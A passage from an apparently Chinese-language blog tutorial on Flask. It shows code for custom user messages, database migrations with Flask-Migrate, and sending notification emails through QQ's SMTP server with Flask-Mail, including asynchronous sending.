Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'I am Lethe'</span></span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'SQLALCHEMY_DATABASE_URI'</span>] = <span class="string">'sqlite:///'</span> + \</span><br><span class="line">    os.path.join(basedir, <span class="string">'data.sqlite'</span>)</span><br><span class="line">app.config[<span class="string">'SQLALCHEMY_TRACK_MODIFICATIONS'</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line">moment = Moment(app)</span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line">migrate = Migrate(app, db)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm</span><span class="params">(FlaskForm)</span>:</span></span><br><span class="line">    name = StringField(<span class="string">'What is your name?'</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">'Submit'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Role</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'roles'</span></span><br><span class="line">    id = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">64</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    users = db.relationship(<span class="string">'User'</span>, backref=<span class="string">'role'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&amp;lt;Role %r&gt;'</span> % self.name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'users'</span></span><br><span class="line">    id = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    username = db.Column(db.String(<span class="number">64</span>), unique=<span class="literal">True</span>, index=<span class="literal">True</span>)</span><br><span class="line">    role_id = db.Column(db.Integer, db.ForeignKey(<span class="string">'roles.id'</span>))</span><br><span class="line">    message = db.Column(db.Text)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&amp;lt;User %r&gt;'</span> % self.username</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.shell_context_processor</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_shell_context</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> dict(db=db, User=User, Role=Role)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    form = NameForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        <span class="comment"># 根据输入的数据查询数据库</span></span><br><span class="line">        user = User.query.filter_by(username=form.name.data).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># 若数据库没有该用户，则添加该用户</span></span><br><span class="line">            user = User(username=form.name.data)</span><br><span class="line">            db.session.add(user)</span><br><span class="line">            db.session.commit()</span><br><span class="line">            session[<span class="string">'known'</span>] = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">'known'</span>] = <span class="literal">True</span></span><br><span class="line">        session[<span class="string">'name'</span>] = form.name.data</span><br><span class="line">        <span class="comment"># 定制的消息</span></span><br><span class="line">        session[<span class="string">'message'</span>] = user.message</span><br><span class="line">        form.name.data = <span class="string">''</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,</span><br><span class="line">                           form=form, name=session.get(<span class="string">'name'</span>),</span><br><span class="line">                           known=session.get(<span class="string">'known'</span>, <span class="literal">False</span>),</span><br><span class="line">                           message=session.get(<span class="string">'message'</span>))</span><br></pre></td></tr></table></figure>
<p>（4）再修该一下tempates/index.html，使其能够显示定制消息：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends "base.html" %&#125;</span><br><span class="line">&#123;% import "bootstrap/wtf.html" as wtf %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;Flasky&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block page_content %&#125;</span><br><span class="line">&amp;lt;div class="page-header"&gt;</span><br><span class="line">    &amp;lt;h1&gt;Hello, &#123;% if name %&#125;&#123;&#123; name &#125;&#125;&#123;% else %&#125;Stranger&#123;% endif %&#125;!&amp;lt;/h1&gt;</span><br><span class="line">    &#123;% if not known %&#125;</span><br><span class="line">    &amp;lt;p&gt;Pleased to meet you!&amp;lt;/p&gt;</span><br><span class="line">    &#123;% else %&#125;</span><br><span class="line">    &amp;lt;p&gt;Happy to see you again!&amp;lt;/p&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">    &#123;% if message %&#125;</span><br><span class="line">    &amp;lt;h3&gt;&#123;&#123; message &#125;&#125;&amp;lt;/h3&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&amp;lt;/div&gt;</span><br><span class="line">&#123;&#123; wtf.quick_form(form) &#125;&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
<p>（5）效果如下：</p>
<p>① admin用户<br><img src="/2020/02/01/Flask-Notes/20200131181148133.png" alt="在这里插入图片描述"><br>② Lethe用户<br><img src="/2020/02/01/Flask-Notes/20200131181223198.png" alt="在这里插入图片描述"><br>③ 其他用户<br><img src="/2020/02/01/Flask-Notes/20200131181249640.png" alt="在这里插入图片描述"></p>
<h5 id="7-4-添加几个迁移"><a href="#7-4-添加几个迁移" class="headerlink" title="7.4 添加几个迁移"></a>7.4 添加几个迁移</h5><p>（1）在开发项目的过程中，时常要修改数据库模型。如果使用迁移框架管理数据库，必须在迁移脚本中定义所有改动，否则改动将不可复现。</p>
<p><strong>修改数据库</strong>的步骤与创建第一个迁移类似：<br>① 对数据库模型做必要的修改。<br>② 执行 <code>flask db migrate</code> 命令，生成迁移脚本。<br>③ 检查自动生成的脚本，改正不准确的地方。<br>④ 执行 <code>flask db upgrade</code> 命令，把改动应用到数据库中。</p>
<p>（2）实现一个功能时，可能要多次修改数据库模型才能得到预期结果。如果前一个迁移还未提交到源码控制系统中，可以继续在那个迁移中修改，以免创建大量无意义的小迁移脚本。</p>
<p>在前一个迁移脚本的基础上修改的步骤如下：<br>① 执行 <code>flask db downgrade</code> 命令，还原前一个脚本对数据库的改动（注意，这可能导致部分数据丢失）。<br>② 删除前一个迁移脚本，因为现在已经没什么用了。<br>③ 执行 <code>flask db migrate</code> 命令生成一个新的数据库迁移脚本。这个迁移脚本除了前面删除的那个脚本中的改动之外，还包括这一次对模型的改动。<br>④ 根据前面的说明，检查并应用迁移脚本。</p>
<hr>
<p>与数据库迁移相关的其他子命令参见 Flask-Migrate 文档（<a href="https://flask-migrate.readthedocs.io/" target="_blank" rel="noopener">https://flask-migrate.readthedocs.io/</a> ）</p>
<p>&lt;br&gt;</p>
<h1 id="0x05-电子邮件"><a href="#0x05-电子邮件" class="headerlink" title="0x05 电子邮件"></a>0x05 电子邮件</h1><p>在 Python 标准库中通常使用 smtplib 包发送电子邮件，而 Flask 中的 Flask-Mail 扩展不仅包装了 smtplib，且能更好的与 Flask 集成。首先在虚拟环境中安装此扩展：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install flask-mail</span><br></pre></td></tr></table></figure>
<p>Flask-Mail文档：<a href="http://www.pythondoc.com/flask-mail/index.html" target="_blank" rel="noopener">http://www.pythondoc.com/flask-mail/index.html</a></p>
<h3 id="一、配置-2"><a href="#一、配置-2" class="headerlink" title="一、配置"></a>一、配置</h3><p>Flask-Mail 连接到简单邮件传输协议（SMTP，simple mail transferprotocol）服务器，把邮件交给这个服务器发送。如果不进行配置，则 Flask-Mail 连接 localhost 上的 25 端口，无须验证身份即可发送电子邮件。</p>
<p>Flask-Mail SMTP 服务器配置：</p>
<table>
<thead>
<tr>
<th>配置</th>
<th>默认值</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>MAIL_SERVER</td>
<td>localhost</td>
<td>电子邮件服务器的主机名或 IP 地址</td>
</tr>
<tr>
<td>MAIL_PORT</td>
<td>25</td>
<td>电子邮件服务器的端口</td>
</tr>
<tr>
<td>MAIL_USE_TLS</td>
<td>False</td>
<td>启用传输层安全（TLS，transport layer security）协议</td>
</tr>
<tr>
<td>MAIL_USE_SSL</td>
<td>False</td>
<td>启用安全套接层（SSL，secure sockets layer）协议</td>
</tr>
<tr>
<td>MAIL_USERNAME</td>
<td>None</td>
<td>邮件账户的用户名</td>
</tr>
<tr>
<td>MAIL_PASSWORD</td>
<td>None</td>
<td>邮件账户的密码</td>
</tr>
</tbody>
</table>
<p>实际中，连接到外部 SMTP 服务器更方便，如下例使用 qq邮箱的配置：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">app.config[<span class="string">'MAIL_SERVER'</span>] = <span class="string">'smtp.qq.com'</span></span><br><span class="line">app.config[<span class="string">'MAIL_PORT'</span>] = <span class="number">465</span></span><br><span class="line">app.config[<span class="string">'MAIL_USE_SSL'</span>] = <span class="literal">True</span></span><br><span class="line">app.config[<span class="string">'MAIL_USERNAME'</span>] = os.environ.get(<span class="string">'MAIL_USERNAME'</span>)</span><br><span class="line">app.config[<span class="string">'MAIL_PASSWORD'</span>] = os.environ.get(<span class="string">'MAIL_PASSWORD'</span>)</span><br></pre></td></tr></table></figure>
<p>注意qq邮箱需要先开启SMTP服务，并得到授权码：<br><img src="/2020/02/01/Flask-Notes/20200201115007140.png" alt="在这里插入图片描述"><br>MAIL_USERNAME为邮箱号，MAIL_PASSWORD 的值即为生成的授权码。</p>
<p>由于QQ邮箱不支持非加密的协议，那么使用加密协议，分为两种加密协议，选择其中之一即可</p>
<ul>
<li>MAIL_USE_TLS：端口号是587</li>
<li>MAIL_USE_SSL：端口号是465</li>
</ul>
<p>Flask-Mail在使用前也需要进行初始化：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_mail <span class="keyword">import</span> Mail</span><br><span class="line">mail = Mail(app)</span><br></pre></td></tr></table></figure>
<p>保存电子邮件服务器用户名和密码的两个环境变量要在环境中定义。如果你使用的是 Linux 或 macOS，可以按照下面的方式设定这两个变量：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> MAIL_USERNAME=&amp;lt;mail username&gt;</span><br><span class="line"><span class="built_in">export</span> MAIL_PASSWORD=&amp;lt;mail password&gt;</span><br></pre></td></tr></table></figure></p>
<p>微软 Windows 用户可按照下面的方式设定环境变量：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cmd终端</span></span><br><span class="line"><span class="built_in">set</span> MAIL_USERNAME=&amp;lt;mail username&gt;</span><br><span class="line"><span class="built_in">set</span> MAIL_PASSWORD=&amp;lt;mail password&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># powershell终端</span></span><br><span class="line"><span class="variable">$env</span>:MAIL_USERNAME=<span class="string">'&amp;lt;mail username&gt;'</span></span><br><span class="line"><span class="variable">$env</span>:MAIL_PASSWORD=<span class="string">'&amp;lt;mail password&gt;'</span></span><br></pre></td></tr></table></figure></p>
<p>&lt;br&gt;</p>
<h3 id="二、在Python-shell中发送电子邮件"><a href="#二、在Python-shell中发送电子邮件" class="headerlink" title="二、在Python shell中发送电子邮件"></a>二、在Python shell中发送电子邮件</h3><p>打开一个 shell 会话（powershell），来发送一个测试邮件。</p>
<p>先配置一下环境变量，上面的方式定义的是临时环境变量，每个新shell都需要导入一次。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$env</span>:FLASK_APP=<span class="string">'.\hello.py'</span></span><br><span class="line"><span class="variable">$env</span>:MAIL_USERNAME=<span class="string">'your_email@qq.com'</span></span><br><span class="line"><span class="variable">$env</span>:MAIL_PASSWORD=<span class="string">'你的授权码'</span></span><br></pre></td></tr></table></figure>
<p>然后打开 flask shell 进行测试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; from flask_mail import Message</span><br><span class="line">&gt;&gt;&gt; from hello import mail</span><br><span class="line">&gt;&gt;&gt; msg = Message(<span class="string">'test email'</span>, sender=<span class="string">'your_email@qq.com'</span>,  recipients=[<span class="string">'your_email@qq.com'</span>])</span><br><span class="line">&gt;&gt;&gt; msg.body = <span class="string">'This is the plain text body'</span></span><br><span class="line">&gt;&gt;&gt; msg.html = <span class="string">'This is the &amp;lt;b&gt;HTML&amp;lt;/b&gt; body'</span></span><br><span class="line">&gt;&gt;&gt; with app.app_context():</span><br><span class="line">...     mail.send(msg)</span><br></pre></td></tr></table></figure>
<p>注意：Flask-Mail 的 send() 函数使用 current_app ，因此要在激活的应用上下文中执行。</p>
<p>成功收到邮件：<br><img src="/2020/02/01/Flask-Notes/20200201140105853.png" alt="在这里插入图片描述"></p>
<p>&lt;br&gt;</p>
<h3 id="三、在应用中集成邮件发送功能"><a href="#三、在应用中集成邮件发送功能" class="headerlink" title="三、在应用中集成邮件发送功能"></a>三、在应用中集成邮件发送功能</h3><p>一般把发送电子邮件的部分定义为一个函数，这样还可以使用 Jinja2 模板渲染邮件正文，灵活性高。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_mail <span class="keyword">import</span> Message</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主题的前缀</span></span><br><span class="line">app.config[<span class="string">'FLASKY_MAIL_SUBJECT_PREFIX'</span>] = <span class="string">'[Flasky]'</span></span><br><span class="line"><span class="comment"># 发件人地址</span></span><br><span class="line">app.config[<span class="string">'FLASKY_MAIL_SENDER'</span>] = <span class="string">'Flasky Admin &amp;lt;xxxx@qq.com&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sned_email</span><span class="params">(to, subject, template, **kwargs)</span>:</span></span><br><span class="line">    msg = Message(app.config[<span class="string">'FLASKY_MAIL_SUBJECT_PREFIX'</span>] + subject,</span><br><span class="line">                  sender=app.config[<span class="string">'FLASKY_MAIL_SENDER'</span>], recipients=[to])</span><br><span class="line">    msg.body = render_template(template + <span class="string">'.txt'</span>, **kwargs)</span><br><span class="line">    msg.html = render_template(template + <span class="string">'.html'</span>, **kwargs)</span><br><span class="line">    mail.send(msg)</span><br></pre></td></tr></table></figure>
<ul>
<li>send_mail() 函数的参数分别为收件人地址(to)、主题(subject)、渲染邮件正文的模板(template)、关键字参数列表(**kwargs)。</li>
<li>指定模板时不包含扩展名，这样才能使用两个模板分别渲染txt和HTML。</li>
<li>调用者传入<br>的关键字参数将传给 render_template() 函数，作为模板变量提供给模板使用，用于生成电子邮件正文。</li>
</ul>
<p>下面我们修改视图函数 index()，使表单每接收到新的名字，应用就给管理员发送一封电子邮件，修改hello.py如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ...</span></span><br><span class="line">app.config[<span class="string">'FLASKY_ADMIN'</span>] = os.environ.get(<span class="string">'FLASKY_ADMIN'</span>)</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    form = NameForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        user = User.query.filter_by(username=form.name.data).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            user = User(username=form.name.data)</span><br><span class="line">            db.session.add(user)</span><br><span class="line">            db.session.commit()</span><br><span class="line">            session[<span class="string">'known'</span>] = <span class="literal">False</span></span><br><span class="line">            <span class="comment"># 发送电子邮件</span></span><br><span class="line">            <span class="keyword">if</span> app.config[<span class="string">'FLASKY_ADMIN'</span>]:</span><br><span class="line">                sned_email(app.config[<span class="string">'FLASKY_ADMIN'</span>], <span class="string">'New User'</span>,</span><br><span class="line">                          <span class="string">'mail/new_user'</span>, user=user)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">'known'</span>] = <span class="literal">True</span></span><br><span class="line">        session[<span class="string">'name'</span>] = form.name.data</span><br><span class="line">        session[<span class="string">'message'</span>] = user.message</span><br><span class="line">        form.name.data = <span class="string">''</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,</span><br><span class="line">                           form=form, name=session.get(<span class="string">'name'</span>),</span><br><span class="line">                           known=session.get(<span class="string">'known'</span>, <span class="literal">False</span>),</span><br><span class="line">                           message=session.get(<span class="string">'message'</span>))</span><br></pre></td></tr></table></figure>
<p>templates/mai/new_user.txt：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">User &#123;&#123; user.username &#125;&#125; has joined.</span><br></pre></td></tr></table></figure></p>
<p>templates/mai/new_user.html：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">User &amp;lt;b&gt;&#123;&#123; user.username &#125;&#125;&amp;lt;/b&gt; has joined.</span><br></pre></td></tr></table></figure></p>
<ul>
<li>电子邮件的收件人地址保存在环境变量 FLASKY_ADMIN 中，启动前需要导入此环境变量，方法和前面的相同。</li>
<li>我们还需要创建两个模板文件，分别用于渲染纯文本和HTML版本的邮件正文。这两个模板文件都保存在 templates 目录下的 mail 子目录中。</li>
<li>电子邮件的模板中有一个模板参数是用户，因此调用 send_email() 函数时要以关键字参数的形式传入用户。</li>
</ul>
<p>现在每次你在表单中填写新名字(如email test)，管理员(FLASKY_ADMIN)都会收到一封电子邮件。</p>
<p><img src="/2020/02/01/Flask-Notes/20200201144149543.png" alt="在这里插入图片描述"></p>
<p>&lt;br&gt;</p>
<h3 id="四、异步发送电子邮件"><a href="#四、异步发送电子邮件" class="headerlink" title="四、异步发送电子邮件"></a>四、异步发送电子邮件</h3><p>在上面的例子中，我们发现在发送电子邮件的时候，网页会停滞一会，为了避免用户感觉到这样的延迟，可以把发送电子邮件的函数移到后台线程中，修改方法如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_async_email</span><span class="params">(app, msg)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> app.app_context():</span><br><span class="line">        mail.send(msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sned_email</span><span class="params">(to, subject, template, **kwargs)</span>:</span></span><br><span class="line">    msg = Message(app.config[<span class="string">'FLASKY_MAIL_SUBJECT_PREFIX'</span>] + subject,</span><br><span class="line">                  sender=app.config[<span class="string">'FLASKY_MAIL_SENDER'</span>], recipients=[to])</span><br><span class="line">    msg.body = render_template(template + <span class="string">'.txt'</span>, **kwargs)</span><br><span class="line">    msg.html = render_template(template + <span class="string">'.html'</span>, **kwargs)</span><br><span class="line">    thr = Thread(target=send_async_email, args=[app, msg])</span><br><span class="line">    thr.start()</span><br><span class="line">    <span class="keyword">return</span> thr</span><br></pre></td></tr></table></figure>
<p>很多 Flask 扩展都假设已经存在激活的应用上下文和（或）请求上下文。Flask-Mail 的 send() 函数使用 current_app ，因此必须激活应用上下文。</p>
<p>不过，上下文是与线程配套的，在不同的线程中执行 mail.send() 函数时，要使用 app.app_context() 人工创建应用上下文。app 实例作为参数传入线程，因此可以通过它来创建上下文。</p>
<p>&lt;br&gt;</p>
<h1 id="0x06-重构应用结构"><a href="#0x06-重构应用结构" class="headerlink" title="0x06 重构应用结构"></a>0x06 重构应用结构</h1><p>到现在为止，hello.py的完整代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, session, redirect, url_for, flash</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"><span class="keyword">from</span> flask_moment <span class="keyword">import</span> Moment</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">from</span> flask_migrate <span class="keyword">import</span> Migrate</span><br><span class="line"><span class="keyword">from</span> flask_mail <span class="keyword">import</span> Mail</span><br><span class="line"><span class="keyword">from</span> flask_mail <span class="keyword">import</span> Message</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">basedir = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'I am Lethe'</span></span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'SQLALCHEMY_DATABASE_URI'</span>] = <span class="string">'sqlite:///'</span> + \</span><br><span class="line">    os.path.join(basedir, <span class="string">'data.sqlite'</span>)</span><br><span class="line">app.config[<span class="string">'SQLALCHEMY_TRACK_MODIFICATIONS'</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 电子邮件</span></span><br><span class="line">app.config[<span class="string">'MAIL_SERVER'</span>] = <span class="string">'smtp.qq.com'</span></span><br><span class="line">app.config[<span class="string">'MAIL_PORT'</span>] = <span class="number">465</span></span><br><span class="line">app.config[<span class="string">'MAIL_USE_SSL'</span>] = <span class="literal">True</span></span><br><span class="line">app.config[<span class="string">'MAIL_USERNAME'</span>] = os.environ.get(<span class="string">'MAIL_USERNAME'</span>)</span><br><span class="line">app.config[<span class="string">'MAIL_PASSWORD'</span>] = os.environ.get(<span class="string">'MAIL_PASSWORD'</span>)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'FLASKY_MAIL_SUBJECT_PREFIX'</span>] = <span class="string">'[Flasky]'</span></span><br><span class="line">app.config[<span class="string">'FLASKY_MAIL_SENDER'</span>] = <span class="string">'Flasky Admin &amp;lt;xxxxxxx@qq.com&gt;'</span></span><br><span class="line">app.config[<span class="string">'FLASKY_ADMIN'</span>] = os.environ.get(<span class="string">'FLASKY_ADMIN'</span>)</span><br><span class="line"></span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line">moment = Moment(app)</span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line">migrate = Migrate(app, db)</span><br><span class="line">mail = Mail(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm</span><span class="params">(FlaskForm)</span>:</span></span><br><span class="line">    name = StringField(<span class="string">'What is your name?'</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">'Submit'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Role</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'roles'</span></span><br><span class="line">    id = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">64</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    users = db.relationship(<span class="string">'User'</span>, backref=<span class="string">'role'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&amp;lt;Role %r&gt;'</span> % self.name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'users'</span></span><br><span class="line">    id = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    username = db.Column(db.String(<span class="number">64</span>), unique=<span class="literal">True</span>, index=<span class="literal">True</span>)</span><br><span class="line">    role_id = db.Column(db.Integer, db.ForeignKey(<span class="string">'roles.id'</span>))</span><br><span class="line">    message = db.Column(db.Text)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&amp;lt;User %r&gt;'</span> % self.username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.shell_context_processor</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_shell_context</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> dict(db=db, User=User, Role=Role)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_async_email</span><span class="params">(app, msg)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> app.app_context():</span><br><span class="line">        mail.send(msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sned_email</span><span class="params">(to, subject, template, **kwargs)</span>:</span></span><br><span class="line">    msg = Message(app.config[<span class="string">'FLASKY_MAIL_SUBJECT_PREFIX'</span>] + subject,</span><br><span class="line">                  sender=app.config[<span class="string">'FLASKY_MAIL_SENDER'</span>], recipients=[to])</span><br><span class="line">    msg.body = render_template(template + <span class="string">'.txt'</span>, **kwargs)</span><br><span class="line">    msg.html = render_template(template + <span class="string">'.html'</span>, **kwargs)</span><br><span class="line">    thr = Thread(target=send_async_email, args=[app, msg])</span><br><span class="line">    thr.start()</span><br><span class="line">    <span class="keyword">return</span> thr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    form = NameForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        user = User.query.filter_by(username=form.name.data).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            user = User(username=form.name.data)</span><br><span class="line">            db.session.add(user)</span><br><span class="line">            db.session.commit()</span><br><span class="line">            session[<span class="string">'known'</span>] = <span class="literal">False</span></span><br><span class="line">            <span class="comment"># 发送电子邮件</span></span><br><span class="line">            <span class="keyword">if</span> app.config[<span class="string">'FLASKY_ADMIN'</span>]:</span><br><span class="line">                sned_email(app.config[<span class="string">'FLASKY_ADMIN'</span>], <span class="string">'New User'</span>,</span><br><span class="line">                           <span class="string">'mail/new_user'</span>, user=user)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">'known'</span>] = <span class="literal">True</span></span><br><span class="line">        session[<span class="string">'name'</span>] = form.name.data</span><br><span class="line">        session[<span class="string">'message'</span>] = user.message</span><br><span class="line">        form.name.data = <span class="string">''</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,</span><br><span class="line">                           form=form, name=session.get(<span class="string">'name'</span>),</span><br><span class="line">                           known=session.get(<span class="string">'known'</span>, <span class="literal">False</span>),</span><br><span class="line">                           message=session.get(<span class="string">'message'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/user/&amp;lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'user.html'</span>, name=name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pate_not_found</span><span class="params">(e)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'404.html'</span>), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(500)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">internal_server_error</span><span class="params">(e)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'500.html'</span>), <span class="number">500</span></span><br></pre></td></tr></table></figure>
<p>可以看到随着应用复杂程度增加，将所有部分写在一个脚本里会导致许多问题，而不同于多数其他的 Web 框架，Flask 并不强制要求大型项目使用特定的组织方式，应用结构的组织方式完全由开发者决定。</p>
<h3 id="一、项目结构"><a href="#一、项目结构" class="headerlink" title="一、项目结构"></a>一、项目结构</h3><p>多文件 Flask 应用的基本结构如下：</p>
